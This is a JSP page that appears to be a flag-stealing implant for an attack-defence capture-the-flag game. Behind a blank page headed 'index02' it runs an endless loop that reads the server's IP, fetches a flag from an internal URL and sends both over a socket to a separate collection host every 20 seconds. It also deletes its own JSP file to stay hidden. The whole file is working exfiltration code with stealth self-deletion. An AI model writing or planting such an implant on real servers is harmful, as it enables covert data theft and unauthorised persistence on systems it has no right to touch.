<%@page import="java.net.NetworkInterface"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.net.InetAddress"%>
<%@page import="java.io.File"%>
<%@page import="java.net.URL"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.PrintWriter"%>
<%@page import="java.net.Socket"%>
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <title></title>
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
  </head>
  <body>
  	<h1>index02</h1>
  	
  	<%
  		String flagUrl = "http://10.0.0.2:8080/";
  		String charsetName = "UTF8";
  		String socketHost = "172.16.5.13";
  		int socketPort = 6061;
  		
  		String ipAddrStr = "";
	    InetAddress ip = null;
	    try {
	    	boolean bFindIP = false;
	    	Enumeration<NetworkInterface> netInterfaces = (Enumeration<NetworkInterface>) NetworkInterface.getNetworkInterfaces();
	     	while (netInterfaces.hasMoreElements()) {
	      		if (bFindIP) {
	       			break;
		      	}
		      	NetworkInterface ni = (NetworkInterface) netInterfaces.nextElement();
		      	Enumeration<InetAddress> ips = ni.getInetAddresses();
		      	while (ips.hasMoreElements()) {
		       		ip = (InetAddress) ips.nextElement();
		       		if (!ip.isLoopbackAddress() && ip.getHostAddress().matches("(\\d{1,3}\\.){3}\\d{1,3}")) {
		        		bFindIP = true;
		        		break;
		       		}
		      	}
	     	}
	    } catch (Exception e) {}
	    
	    if (null != ip) {
	    	ipAddrStr = ip.getHostAddress();
	    }else{
	    	ipAddrStr = InetAddress.getLocalHost().getHostAddress();
	    }
	    
	    //System.out.println(ipAddrStr);
  	
  	
  		String st = "";
  		while(null != st){
  			//System.out.println("--------------------hello there------------------");
  			
  			String flag = "";
  			
  			InputStreamReader isr = null;
  			BufferedReader br = null;
  			
  			try {
  				URL url = new URL(flagUrl);
  				if (charsetName.equals("")) {
  					isr = new InputStreamReader(url.openStream());
  				} else {
  					isr = new InputStreamReader(url.openStream(), "UTF8");
  				}

  				br = new BufferedReader(isr);

  				String s = "";
  				StringBuffer sb = new StringBuffer("");
  				while ((s = br.readLine()) != null) {
  					sb.append(s);
  				}

  				flag = sb.toString();
  				
  				//System.out.println(flag);
  			} catch (Exception ex) {
  			} finally {
  				try {if(null != br){br.close();}} catch (Exception e) {}
  				try {if(null != isr){isr.close();}} catch (Exception e) {}
  			}
  			
  			
  			Socket socket = null;
  			PrintWriter pw = null;
  			try {
  				socket = new Socket(socketHost, socketPort);
  				pw = new PrintWriter(socket.getOutputStream());
  				pw.println(ipAddrStr + "-----" + flag + "-----" + new SimpleDateFormat("HH:mm:ss").format(new Date()));
  				pw.flush();
  			} catch (Exception e) {
  				//e.printStackTrace();
  			} finally {
  				try {if(null != pw){pw.close();}} catch (Exception e) {}
  				try {if(null != socket){socket.close();}} catch (IOException e) {}
  			}
  			
  			
  			// 删除jsp
  			
  			try{
  				String webContentPath = new File(getClass().getClassLoader().getResource("").toURI()).getPath();
  	  			webContentPath = webContentPath.replace("WEB-INF" + File.separator + "classes", "");
  	  			
  	  			File jspFile = new File(webContentPath + "index02.jsp");
  	  			if(jspFile.exists()){
  	  				jspFile.delete();
  	  			}
  			} catch(Exception e){}
  			
  			
  			Thread.sleep(20000);
  		}
  		
  		
  	        		
  	%>
  </body>
</html>
